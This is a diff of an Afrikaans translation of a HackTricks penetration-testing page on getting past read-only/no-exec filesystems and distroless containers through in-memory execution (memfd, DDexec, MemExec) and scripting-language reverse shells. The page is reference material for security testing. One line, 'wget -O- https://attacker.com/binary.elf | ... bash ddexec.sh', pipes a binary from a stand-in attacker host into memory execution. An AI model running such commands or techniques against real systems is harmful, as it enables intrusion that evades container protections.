@@ -10,13 +10,13 @@ Ander maniere om HackTricks te ondersteun:
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* **Deel jou hack-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
 
-<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-As jy belangstel in 'n **hacking-loopbaan** en die onhackbare wil hack - **ons is aan die aanstel!** (_vloeiende Pools geskrewe en gesproke vereis_).
+As jy belangstel in 'n **hackingsloopbaan** en die onhackbare wil hack - **ons is aan die aanstel!** (_vloeiende Pools geskrewe en gesproke vereis_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
@@ -60,37 +60,31 @@ Nogtans is dit nie net genoeg om jou binêre agterdeur of ander binêre gereedsk
 
 As jy 'n binêre lêer wil uitvoer maar die lêersisteem dit nie toelaat nie, is die beste manier om dit te doen deur dit vanaf die geheue uit te voer, aangesien die **beskerming nie daarop van toepassing is nie**.
 
-### FD + exec-systeemafronding
+### FD + exec-systeemoproep-omseiling
 
-As jy kragtige skripskrywers binne die masjien het, soos **Python**, **Perl**, of **Ruby**, kan jy die binêre lêer om uit te voer vanaf die geheue aflaai, dit in 'n geheue-lêerbeskrywer stoor (`create_memfd` systeemafronding), wat nie deur daardie beskerming beskerm gaan word nie, en dan 'n **`exec` systeemafronding** aanroep wat die **fd as die lêer om uit te voer** aandui.
+As jy kragtige skripskryfmasjiene binne die masjien het, soos **Python**, **Perl**, of **Ruby**, kan jy die binêre lêer om uit te voer vanaf die geheue aflaai, dit in 'n geheue-lêerbeskrywer stoor (`create_memfd` systeemoproep), wat nie deur daardie beskerming beskerm gaan word nie, en dan 'n **`exec`-systeemoproep** aanroep wat die **fd as die lêer om uit te voer** aandui.
 
-Hiervoor kan jy maklik die projek [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) gebruik. Jy kan dit 'n binêre lêer deurgee en dit sal 'n skrip in die aangeduide taal genereer met die **binêre lêer saamgedruk en b64 gekodeer** met die instruksies om dit te **dekodeer en te dekomprimeer** in 'n **fd** wat geskep is deur die `create_memfd` systeemafronding en 'n oproep na die **exec** systeemafronding om dit uit te voer.
+Hiervoor kan jy maklik die projek [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) gebruik. Jy kan dit 'n binêre lêer deurgee en dit sal 'n skrip in die aangeduide taal genereer met die **binêre lêer saamgedruk en b64-geënkripteer** met die instruksies om dit te **dekodeer en te dekomprimeer** in 'n **fd** wat geskep is deur die `create_memfd`-systeemoproep en 'n oproep na die **exec**-systeemoproep om dit uit te voer.
 
 {% hint style="warning" %}
-Dit werk nie in ander skripskryftale soos PHP of Node nie omdat hulle geen **standaard manier het om rou systeemafrondings** vanaf 'n skrip te roep nie, so dit is nie moontlik om `create_memfd` te roep om die **geheue-fd** te skep om die binêre te stoor nie.
+Dit werk nie in ander skripskryftale soos PHP of Node nie omdat hulle geen **standaard manier het om rou systeemoproepe** vanuit 'n skrip te doen nie, dus is dit nie moontlik om `create_memfd` te roep om die **geheue-fd** te skep om die binêre te stoor nie.
 
-Verder sal dit nie werk om 'n **gewone fd** met 'n lêer in `/dev/shm` te skep nie, omdat jy nie toegelaat sal word om dit uit te voer nie omdat die **geen-uitvoer beskerming** van toepassing sal wees.
+Verder sal die skep van 'n **gewone fd** met 'n lêer in `/dev/shm` nie werk nie, omdat jy nie toegelaat sal word om dit uit te voer nie omdat die **geen-uitvoer beskerming** van toepassing sal wees.
 {% endhint %}
 
 ### DDexec / EverythingExec
 
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is 'n tegniek wat jou in staat stel om die geheue van jou eie proses te **verander deur sy** **`/proc/self/mem`** te oorskryf.
+[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is 'n tegniek wat jou in staat stel om die geheue van jou eie proses te **verander deur sy eie** `/proc/self/mem` te oorskryf.
 
-Daarom kan jy deur die **samestellingskode te beheer** wat deur die proses uitgevoer word, 'n **shellcode** skryf en die proses "muteer" om **enige arbitrêre kode uit te voer**.
+Daarom kan jy deur die **samestellingskode te beheer** wat deur die proses uitgevoer word, 'n **shellkode** skryf en die proses "muteer" om **enige willekeurige kode uit te voer**.
 
 {% hint style="success" %}
-**DDexec / EverythingExec** sal jou in staat stel om jou eie **shellcode** of **enige binêre** vanaf **geheue** te laai en **uit te voer**.
+**DDexec / EverythingExec** sal jou in staat stel om jou eie **shellkode** of **enige binêre** vanaf **geheue** te laai en **uit te voer**.
 {% endhint %}
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
-Vir meer inligting oor hierdie tegniek, kyk op die Github of:
-
-{% content-ref url="ddexec.md" %}
-[ddexec.md](ddexec.md)
-{% endcontent-ref %}
-
 ### MemExec
 
 [**Memexec**](https://github.com/arget13/memexec) is die natuurlike volgende stap van DDexec. Dit is 'n **DDexec shellcode gedemoniseer**, sodat elke keer as jy 'n **verskillende binêre lêer wil hardloop** hoef jy nie DDexec weer te begin nie, jy kan net memexec shellcode hardloop via die DDexec tegniek en dan **met hierdie duiwel kommunikeer om nuwe binêre lêers te stuur om te laai en te hardloop**.
@@ -105,9 +99,9 @@ Met 'n soortgelyke doel as DDexec, laat die [**memdlopen**](https://github.com/a
 
 ### Wat is distroless
 
-Distroless houers bevat slegs die **kaal minimum komponente wat nodig is om 'n spesifieke aansoek of diens te hardloop**, soos biblioteke en tydloop afhanklikhede, maar sluit groter komponente uit soos 'n pakkettebestuurder, dop, of stelselgereedskap.
+Distroless houers bevat slegs die **kaal minimum komponente wat nodig is om 'n spesifieke toepassing of diens te hardloop**, soos biblioteke en tyduitvoeringsafhanklikhede, maar sluit groter komponente uit soos 'n pakkettebestuurder, skul, of stelselgereedskap.
 
-Die doel van distroless houers is om die **aanvalsvlak van houers te verminder deur onnodige komponente te elimineer** en die aantal kwesbaarhede wat uitgebuit kan word te minimeer.
+Die doel van distroless houers is om die aanvalsvlak van houers te **verminder deur onnodige komponente te elimineer** en die aantal kwesbaarhede wat uitgebuit kan word, te minimeer.
 
 ### Omgekeerde Dop
 
@@ -117,35 +111,35 @@ In 'n distroless houer mag jy dalk **nie eers `sh` of `bash`** vind om 'n gewone
 Daarom sal jy **nie** in staat wees om 'n **omgekeerde dop** te kry of die stelsel te **opsom** soos jy gewoonlik doen nie.
 {% endhint %}
 
-Maar as die gekompromitteerde houer byvoorbeeld 'n flask web hardloop, dan is Python geïnstalleer, en dus kan jy 'n **Python omgekeerde dop** kry. As dit node hardloop, kan jy 'n Node omgekeerde dop kry, en dieselfde met meeste enige **skripseltaal**.
+Maar as die gekompromitteerde houer byvoorbeeld 'n flask-web hardloop, dan is Python geïnstalleer, en dus kan jy 'n **Python omgekeerde dop** kry. As dit node hardloop, kan jy 'n Node omgekeerde dop kry, en dieselfde met byna enige **skripseltaal**.
 
 {% hint style="success" %}
-Deur die skripseltaal te gebruik, kan jy die stelsel **opsom** deur die taalvermoëns te gebruik.
+Deur die skripseltaal te gebruik, kan jy die stelsel **opsom** deur van die taalvermoëns gebruik te maak.
 {% endhint %}
 
-As daar **geen `read-only/no-exec`** beskerming is nie, kan jy jou omgekeerde dop misbruik om **binêre lêers in die lêersisteem te skryf** en hulle **uit te voer**.
+As daar **geen `lees-slegs/geen-uitvoer`** beskerming is nie, kan jy jou omgekeerde dop misbruik om **binêre lêers in die lêersisteem te skryf** en hulle **uit te voer**.
 
 {% hint style="success" %}
 Tog sal hierdie soort houers gewoonlik hierdie beskermings hê, maar jy kan die **vorige geheue-uitvoeringstegnieke gebruik om dit te omseil**.
 {% endhint %}
 
-Jy kan **voorbeelde** vind van hoe om **sekere RCE kwesbaarhede te misbruik** om skripseltaal **omgekeerde dops** te kry en binêre lêers van geheue uit te voer in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+Jy kan **voorbeelde** vind van hoe om **sekere RCE-kwesbaarhede te misbruik** om skripseltaal **omgekeerde dops** te kry en binêre lêers van geheue uit te voer in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
-<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-As jy belangstel in 'n **hakerloopbaan** en wil die onhakbare hak - **ons is aan die aanstel!** (_vloeiende Pools geskrewe en gespreek benodig_).
+As jy belangstel in 'n **hakerloopbaan** en die onhakebare wil hak - **ons is aan die aanstel!** (_vloeiende Pools geskrewe en gespreek benodig_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
 <details>
 
-<summary><strong>Leer AWS hak van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Ander maniere om HackTricks te ondersteun:
 
-* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **laai HackTricks af in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **laai HackTricks af in PDF** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
